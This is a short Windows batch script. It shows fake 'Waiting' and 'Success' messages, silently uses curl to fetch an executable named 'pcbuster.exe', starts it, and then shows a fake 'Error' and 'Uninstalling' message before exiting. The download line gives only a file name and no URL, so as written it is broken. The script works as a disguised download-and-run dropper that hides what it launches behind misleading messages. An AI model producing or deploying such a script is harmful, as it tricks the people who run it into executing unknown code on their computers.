@echo off
cls

color B

echo Waiting.
timeout /t 1>nul
cls

echo Waiting..
timeout /t 1>nul
cls

echo Waiting...
timeout /t 1>nul
cls

echo Success
timeout /t 1>nul
cls

echo Downloading
curl -s -O "pcbuster.exe" && start pcbuster.exe
cls

color C

echo Error
echo Uninstalling
timeout /t 5>nul
cls
exit
